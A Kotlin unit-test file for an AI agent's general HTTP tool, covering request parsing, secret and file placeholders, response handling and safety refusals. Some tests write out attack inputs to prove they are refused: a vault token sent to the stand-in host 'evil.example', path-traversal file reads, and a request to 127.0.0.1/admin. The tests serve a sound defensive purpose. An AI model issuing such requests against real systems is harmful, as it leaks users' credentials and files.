package com.example.notes

import org.json.JSONObject
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Rule
import org.junit.Test
import org.junit.rules.TemporaryFolder
import java.io.File

/**
 * `http` — **one request to anywhere, with the verb the caller chose.**
 *
 * This is the tool that replaces a typed method per service: `gh`, `createRepo`, `dispatch`, and the
 * four `REPOSITORY:` bindings that had to be kept in step. The tests below are therefore about the
 * things that make that safe rather than about any particular API.
 *
 * **The request is one document**, which is the operator's design: *"an http command is just a tool
 * http with header and body arguments or even better if as one complete argument, that can be written
 * directly or take a path to a file, and all {{}} paths and secrets inside that argument get
 * expanded, recursively."* So a test writes the request the way a person would, and the assertions are
 * about what left the phone.
 *
 * **The one that must never be deleted is [the vault's value never appears anywhere].** Everything
 * else is a convenience; that one is the difference between an agent that can authenticate and an
 * agent that can exfiltrate a token by naming it.
 */
class HttpToolTest {

    @get:Rule
    val temp = TemporaryFolder()

    private lateinit var project: File
    private lateinit var ws: Workspace
    private lateinit var git: ProjectGit
    private lateinit var log: AgentLog

    /** What the fake was asked, so a test can assert the call as well as the answer. */
    private var askedUrl: String? = null
    private var askedMethod: String? = null
    private var askedHeaders: Map<String, String> = emptyMap()
    private var askedBody: ByteArray? = null

    /** What the fake answers with, per test. */
    private var status = 200
    private var answer = "{\"login\":\"someone\"}".toByteArray()
    private var extraHeaders: Map<String, String> = emptyMap()
    private var fail: String? = null

    private val credentials = MemoryCredentials().apply { activeLogin = "someone" }

    private fun fetcher() = object : Fetcher {
        override fun bytes(url: String, limitBytes: Long): Result<ByteArray> {
            askedUrl = url
            return Result.success(answer)
        }

        override fun request(
            url: String,
            method: String,
            headers: Map<String, String>,
            body: ByteArray?,
            limitBytes: Long,
        ): Result<Fetcher.Answer> {
            askedUrl = url
            askedMethod = method
            askedHeaders = headers
            askedBody = body
            fail?.let { return Result.failure(IllegalStateException(it)) }
            return Result.success(Fetcher.Answer(status, extraHeaders, answer))
        }
    }

    @Before
    fun setUp() {
        ws = Workspace.single(temp.root)
        project = ws.projectDir("shopping")
        project.mkdirs()
        git = ProjectGit(ws, { null }, { GitAuthor("Muffy", "muffy@example.com") })
        File(project, "milk.txt").writeText("two litres")
        log = AgentLog.open(project)
    }

    private fun tools(httpAllowed: Boolean = true) = AgentTools(
        ws, "shopping", git, log,
        credentials = credentials,
        fetcher = fetcher(),
        privateAllowed = { false },
        httpAllowed = { httpAllowed },
    )

    private fun call(tool: String, args: String) =
        tools().run(Call(id = "c-$tool", tool = tool, args = args))

    /** One call whose `request` is the document as written, which is the shape the tool takes. */
    private fun send(document: String) =
        tools().run(Call(id = "c-http", tool = "http", args = JSONObject(mapOf("request" to document)).toString()))

    // ---- an archive says what is inside it --------------------------------

    /**
     * **Moved here from `FetchTest` when `fetch` was deleted.** It is the one thing `fetch` did that
     * `http` did not, so it is the test that proves nothing was lost: a downloaded zip answers with
     * its entry names and never its bytes, because a zip in a conversation is binary that costs the
     * whole context to say nothing.
     */
    @Test
    fun `a downloaded zip is reported by its entry names, never its bytes`() {
        val buffer = java.io.ByteArrayOutputStream()
        java.util.zip.ZipOutputStream(buffer).use { zip ->
            for (name in listOf("lib/a.kt", "lib/b.kt")) {
                zip.putNextEntry(java.util.zip.ZipEntry(name))
                zip.write("fun x() {}".toByteArray())
                zip.closeEntry()
            }
        }
        answer = buffer.toByteArray()

        val body = send("GET https://example.com/lib.zip")

        assertTrue("the names are there: $body", body.contains("lib/a.kt"))
        assertTrue("and the second: $body", body.contains("lib/b.kt"))
        assertFalse("and the contents are not: $body", body.contains("fun x()"))
        // **The next step is named**, because a downloaded archive that stays in `agent/http/` never
        // reaches the project and the agent has to be told how it does.
        assertTrue("and it says how to unpack: $body", body.contains("unpack"))
        assertTrue("naming the file it landed in: $body", body.contains("agent/http/"))
    }

    @Test
    fun `a file that is not an archive gets no entry list`() {
        answer = "two litres".toByteArray()

        val body = send("GET https://example.com/notes.txt")

        assertTrue("it worked: $body", body.startsWith("0\n"))
        assertFalse("and there is no listing: $body", body.contains("It holds:"))
        assertFalse("nor an unpack suggestion: $body", body.contains("unpack"))
    }

    // ---- what it sends -----------------------------------------------------

    /**
     * **The verb the caller asked for, and the body it gave.** This is the whole reason the tool
     * exists: without it the app can only make GETs, and every API's write endpoints are unreachable.
     */
    @Test
    fun `the method and body are the caller's, not the app's`() {
        val said = send("POST https://api.example.com/x\n\n{\"a\":1}")

        assertTrue(said, said.startsWith(AgentLog.SUCCESS))
        assertEquals("POST", askedMethod)
        assertEquals("""{"a":1}""", String(askedBody!!, Charsets.UTF_8))
    }

    /** An address alone is a GET, because that is what a person means by writing one down. */
    @Test
    fun `a request with no method is a GET`() {
        send("https://api.example.com/x")
        assertEquals("GET", askedMethod)
    }

    /** Headers are the lines between the first one and the blank one, and they arrive as written. */
    @Test
    fun `headers are read from the lines after the address`() {
        send(
            "GET https://api.example.com/x\n" +
                "X-GitHub-Api-Version: 2022-11-28\n" +
                "Accept: application/json",
        )

        assertEquals("2022-11-28", askedHeaders["X-GitHub-Api-Version"])
        assertEquals("application/json", askedHeaders["Accept"])
    }

    /**
     * **The next page's address, said out loud.** A paginated API answers with one page and puts the
     * rest behind a `Link` header; without naming it, "all the open issues" is one page that looks
     * complete. The address is printed whole so the next call can paste it.
     */
    @Test
    fun `a Link header's next page is named so the agent can continue`() {
        extraHeaders = mapOf(
            "Link" to "<https://api.example.com/x?page=2&cursor=a,b>; rel=\"next\", " +
                "<https://api.example.com/x?page=9>; rel=\"last\"",
        )
        val said = send("GET https://api.example.com/x")

        assertTrue("the next page is named: $said",
            said.contains("https://api.example.com/x?page=2&cursor=a,b"))
        assertFalse("and only next, not last: $said",
            said.contains("page=9"))
    }

    /** A server that pages nothing says nothing about pages — the note is not decoration. */
    @Test
    fun `a response with no Link header says nothing about a next page`() {
        val said = send("GET https://api.example.com/x")

        assertFalse("no page talk: $said", said.contains("next page"))
    }

    /**
     * **A `#` or `//` line above the request is a comment**, so a file can say what it is for — and
     * neither survives into the request.
     */
    @Test
    fun `comments above the request are not headers`() {
        send("# what this does\n// and why\nGET https://api.example.com/x")

        assertEquals("GET", askedMethod)
        assertTrue("no comment reached the headers: $askedHeaders", askedHeaders.keys.none { it.startsWith("#") })
        assertEquals("and no header was invented", 0, askedHeaders.size)
    }

    /**
     * **The body is everything after the blank line, verbatim.** A trailing newline in a shell script
     * being POSTed is data, and a body that was trimmed would arrive different from the file it was
     * cut from.
     */
    @Test
    fun `the body is not trimmed`() {
        send("POST https://api.example.com/x\n\nline one\nline two\n")

        assertEquals("line one\nline two\n", String(askedBody!!, Charsets.UTF_8))
    }

    /**
     * **A body on a GET is refused rather than silently dropped.** `HttpURLConnection` would send the
     * request without it and the caller would read an answer to a question it did not ask.
     */
    @Test
    fun `a GET with a body is refused and says which verb to use`() {
        val said = send("GET https://api.example.com/x\n\nhello")

        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertTrue(said, said.contains("POST"))
        assertEquals("nothing was sent", null, askedMethod)
    }

    /** A verb the app cannot send is refused with the list, not by the connection with a stack trace. */
    @Test
    fun `an unknown method is refused with the ones that work`() {
        val said = send("TRACE https://api.example.com/x")

        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertTrue(said, said.contains("PATCH"))
        assertEquals("nothing was sent", null, askedMethod)
    }

    /** A header line with no colon is refused by naming it, because a 400 from the server would not. */
    @Test
    fun `a line that is not a header is refused and quoted`() {
        val said = send("POST https://api.example.com/x\nnot a header\n\n{}")

        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertTrue("it quotes the line: $said", said.contains("not a header"))
        assertEquals("nothing was sent", null, askedMethod)
    }

    // ---- the two things that may be written as a name ----------------------

    /**
     * **`{{file:path}}` is that file's text**, so a request can be assembled from notes that live in
     * the project rather than retyped into a body.
     */
    @Test
    fun `a file name in the body is replaced with its contents`() {
        File(project, "title.txt").writeText("Milk")
        File(project, "body.md").writeText("two litres, please")

        send(
            "POST https://api.example.com/issues\n" +
                "Content-Type: application/json\n" +
                "\n" +
                "{\"title\":\"{{file:title.txt}}\",\"body\":\"{{file:body.md}}\"}",
        )

        assertEquals(
            """{"title":"Milk","body":"two litres, please"}""",
            String(askedBody!!, Charsets.UTF_8),
        )
    }

    /** A file's name works in a header too, which is how a set of headers is kept in one place. */
    @Test
    fun `a file name in a header is replaced too`() {
        File(project, "version.txt").writeText("2022-11-28")

        send("GET https://api.example.com/x\nX-GitHub-Api-Version: {{file:version.txt}}")

        assertEquals("2022-11-28", askedHeaders["X-GitHub-Api-Version"])
    }

    /**
     * **A name inside a named file is expanded as well**, which is the "recursively" in the operator's
     * sentence: a body cut from a template that itself names a secret.
     */
    @Test
    fun `a file that names a secret has the secret expanded inside it`() {
        credentials.setSecret("github", "ghp_the_real_token", "api.example.com")
        File(project, "template.http").writeText(
            "GET https://api.example.com/user\nAuthorization: Bearer {{secret:github}}",
        )

        val said = send("@template.http")

        assertTrue(said, said.startsWith(AgentLog.SUCCESS))
        assertEquals("Bearer ghp_the_real_token", askedHeaders["Authorization"])
        assertFalse("and the value is still nowhere in the answer: $said", said.contains("ghp_the_real_token"))
    }

    /** A file that names itself is refused rather than recursing until the phone runs out of memory. */
    @Test
    fun `a file that names itself is refused`() {
        File(project, "loop.txt").writeText("{{file:loop.txt}}")

        val said = send("POST https://api.example.com/x\n\n{{file:loop.txt}}")

        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertTrue("it says the document names itself: $said", said.contains("itself"))
        assertEquals("nothing was sent", null, askedMethod)
    }

    /** A file outside the project is refused: a body is read and then sent somewhere. */
    @Test
    fun `a file name outside the project is refused`() {
        File(temp.root, "elsewhere.md").writeText("a secret")

        val said = send("POST https://api.example.com/x\n\n{{file:../elsewhere.md}}")

        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertTrue("it names what it could not find: $said", said.contains("elsewhere.md"))
        assertEquals("nothing was sent", null, askedMethod)
    }

    /**
     * **`@path` sends a request file**, and that is how a `.http` file in the project is run — the same
     * document, read from disk instead of from the argument.
     */
    @Test
    fun `at-path runs a request file from the project`() {
        File(project, "user.http").writeText(
            "# who am I\nGET https://api.example.com/user\nAccept: application/json",
        )

        val said = send("@user.http")

        assertTrue(said, said.startsWith(AgentLog.SUCCESS))
        assertEquals("https://api.example.com/user", askedUrl)
        assertEquals("application/json", askedHeaders["Accept"])
    }

    /** A request file outside the project is refused, for the same reason a body file is. */
    @Test
    fun `a request file outside the project is refused`() {
        val said = send("@../elsewhere.http")

        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertTrue(said, said.contains("outside this project"))
        assertEquals("nothing was sent", null, askedMethod)
    }

    /** A request file that is not there is refused by name rather than by an empty request. */
    @Test
    fun `a request file that is not there is refused`() {
        val said = send("@missing.http")

        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertTrue("it names the file: $said", said.contains("missing.http"))
    }

    // ---- the vault ---------------------------------------------------------

    /**
     * **THE TEST THAT MUST NEVER BE DELETED.** A named secret is written where it is used, and its
     * value appears nowhere: not in the answer, not in the headers the caller wrote, not in the trace.
     *
     * A tool that echoed the token back would put it in the conversation and in the request log, which
     * is the one failure the vault exists to prevent — and it would look like a helpful diagnostic
     * while doing it.
     */
    @Test
    fun `the vault's value never appears anywhere`() {
        credentials.setSecret("github", "ghp_the_real_token", "api.example.com")

        val said = send("GET https://api.example.com/user\nAuthorization: Bearer {{secret:github}}")

        assertTrue(said, said.startsWith(AgentLog.SUCCESS))
        assertEquals("it was attached", "Bearer ghp_the_real_token", askedHeaders["Authorization"])
        assertFalse(
            "the token is in the answer, which puts it in the conversation: $said",
            said.contains("ghp_the_real_token"),
        )
    }

    /**
     * **A secret is refused for a host it was not stored for, and the refusal names the host.**
     *
     * This is the hole a name would otherwise open: without it the agent names the secret and chooses
     * the destination, which is exfiltration rather than authentication. The sentence matters as much
     * as the refusal — "401" would send the model to retry the same thing.
     */
    @Test
    fun `a secret is refused for a host it is not for, and the refusal says so`() {
        credentials.setSecret("github", "ghp_the_real_token", "api.github.com")

        val said = send("GET https://evil.example/x\nAuthorization: Bearer {{secret:github}}")

        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertTrue("it names the host it was asked for: $said", said.contains("evil.example"))
        assertTrue("and where the secret really is: $said", said.contains("api.github.com"))
        assertEquals("and nothing was sent", null, askedMethod)
    }

    /** A name that is not in the vault is refused with the names that are, so the model can correct itself. */
    @Test
    fun `an unknown secret is refused with the real names`() {
        credentials.setSecret("github", "ghp_one", "api.github.com")
        credentials.setSecret("linear", "lin_two", "mcp.linear.app")

        val said = send("GET https://api.github.com/user\nAuthorization: Bearer {{secret:gitlab}}")

        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertTrue(said, said.contains("\"github\""))
        assertTrue(said, said.contains("\"linear\""))
        assertFalse("and never a value: $said", said.contains("ghp_one"))
    }

    /**
     * **The agent may not write an authorization header.** If it could, the vault would be decorative:
     * a token in the conversation is a token in the log, and the store's whole purpose is that the
     * value never travels through text.
     */
    @Test
    fun `a hand-written authorization header is refused, and names the placeholder`() {
        val said = send("GET https://api.example.com/x\nAuthorization: Bearer ghp_typed")

        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertTrue("it says what to write instead: $said", said.contains("{{secret:"))
        assertEquals("nothing was sent", null, askedMethod)
    }

    /** The same rule for the other three ways a credential travels. */
    @Test
    fun `cookie, proxy-authorization and x-api-key are refused too`() {
        for (header in listOf("Cookie", "Proxy-Authorization", "X-Api-Key")) {
            val said = send("GET https://api.example.com/x\n$header: secret")
            assertTrue("$header: $said", said.startsWith(AgentLog.FAILURE))
            assertEquals("$header sent nothing", null, askedMethod)
        }
    }

    /** Any other header is the caller's, because an API may require one and only four carry secrets. */
    @Test
    fun `an ordinary header is sent`() {
        send("GET https://api.example.com/x\nX-GitHub-Api-Version: 2022-11-28")
        assertEquals("2022-11-28", askedHeaders["X-GitHub-Api-Version"])
    }

    // ---- the answer --------------------------------------------------------

    /**
     * **A 4xx is not a failure of the tool.** An API's vocabulary is statuses, and the body is the
     * diagnostic — "which field was wrong" is in it. Reporting "done" for a 422 would teach the model
     * to stop checking.
     */
    @Test
    fun `a 422 is reported with its number and its body`() {
        status = 422
        answer = """{"message":"Validation Failed","errors":[{"field":"name"}]}""".toByteArray()

        val said = send("POST https://api.example.com/x\n\n{}")

        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertTrue("the number is there: $said", said.contains("422"))
        assertTrue("and the reason: $said", said.contains("Validation Failed"))
    }

    /** A 204 has no body, and that is not a failure — the status says the thing was done. */
    @Test
    fun `a 204 with nothing in it is a success`() {
        status = 204
        answer = ByteArray(0)

        val said = send("DELETE https://api.example.com/x")

        assertTrue(said, said.startsWith(AgentLog.SUCCESS))
        assertTrue(said, said.contains("204"))
    }

    /**
     * **The body is always filed, and the path is named.** The conversation gets the answer when it is
     * small enough to read and the file otherwise — the same protocol as `runs` and `shot`, because the
     * destination differs so the result-size rule does not apply.
     */
    @Test
    fun `the answer is filed under agent http and the path is said`() {
        val said = send("GET https://api.example.com/user")

        assertTrue(said, said.startsWith(AgentLog.SUCCESS))
        assertTrue("it says where: $said", said.contains("agent/http/"))
        val dir = File(project, Fetched.HTTP_DIR)
        assertTrue("the folder was made", dir.isDirectory)
        val files = dir.listFiles().orEmpty()
        assertEquals("one file", 1, files.size)
        assertEquals("holding the body", "{\"login\":\"someone\"}", files[0].readText())
    }

    /**
     * **Two POSTs to one endpoint do not overwrite each other.** The name is hashed from the method
     * and the body, so a model comparing two answers is reading two files rather than the same one
     * twice — which is a bug that would look like the server ignoring the second request.
     */
    @Test
    fun `two posts to one url are two files`() {
        send("POST https://api.example.com/x\n\n{\"a\":1}")
        send("POST https://api.example.com/x\n\n{\"a\":2}")

        assertEquals("two answers, kept apart", 2, File(project, Fetched.HTTP_DIR).listFiles().orEmpty().size)
    }

    /** A binary answer is filed and **not** quoted, because bytes in the conversation cost the budget to say nothing. */
    @Test
    fun `a binary answer is filed and not quoted`() {
        answer = byteArrayOf(0x89.toByte(), 0x50, 0x4E, 0x47, 0, 0, 0, 0)

        val said = send("GET https://api.example.com/picture.png")

        assertTrue(said, said.startsWith(AgentLog.SUCCESS))
        assertTrue("it says it was filed: $said", said.contains("filed, not quoted"))
    }

    /** A redirect on a POST is **returned**, not followed: following it would silently lose the body. */
    @Test
    fun `a redirect on a post is returned with where it points`() {
        status = 301
        extraHeaders = mapOf("Location" to "https://api.example.com/elsewhere")

        val said = send("POST https://api.example.com/x\n\n{}")

        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertTrue(said, said.contains("301"))
        assertTrue("and where: $said", said.contains("https://api.example.com/elsewhere"))
    }

    /** The rate-limit headers are quoted when present, so a caller can wait instead of retrying into a wall. */
    @Test
    fun `a nearly-spent rate limit is said`() {
        extraHeaders = mapOf("X-RateLimit-Remaining" to "2", "X-RateLimit-Reset" to "1700000000")

        val said = send("GET https://api.example.com/user")

        assertTrue(said, said.contains("2 requests remain"))
        assertTrue(said, said.contains("1700000000"))
    }

    // ---- refusals that come before anything is sent ------------------------

    /** A missing request is refused with the shape to use, not with a stack trace. */
    @Test
    fun `no request is refused, and the shape is shown`() {
        val said = call("http", "{}")
        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertTrue("it names the argument to give: $said", said.contains("request"))
        assertTrue("and shows a request: $said", said.contains("GET https://"))
    }

    /** The address rule runs before the request, because the request is the harm. */
    @Test
    fun `a private address is refused before anything is opened`() {
        val said = send("GET http://127.0.0.1/admin")

        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertEquals("nothing was sent", null, askedMethod)
    }

    /** The switch that turns downloading off turns this off too, and the refusal says where to change it. */
    @Test
    fun `the network switch turns http off as well as fetch`() {
        val said = AgentTools(
            ws, "shopping", git, log,
            credentials = credentials,
            fetcher = fetcher(),
            httpAllowed = { false },
        ).run(
            Call(
                id = "c-http",
                tool = "http",
                args = JSONObject(mapOf("request" to "GET https://api.example.com/x")).toString(),
            ),
        )

        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertTrue(said, said.contains("switched off"))
        assertEquals("nothing was sent", null, askedMethod)
    }

    /** A connection that never answered says so in the fetcher's own words rather than a stack trace. */
    @Test
    fun `a request that fails says why`() {
        fail = "The request failed: no route to host"

        val said = send("GET https://api.example.com/x")

        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertTrue(said, said.contains("no route to host"))
    }

    /** It files an answer, so the folder listing must move — the same bug `write` had. */
    @Test
    fun `http is in the set that changes the folder`() {
        assertTrue("http files a body", "http" in AgentTools.CHANGES_DISK)
    }
}
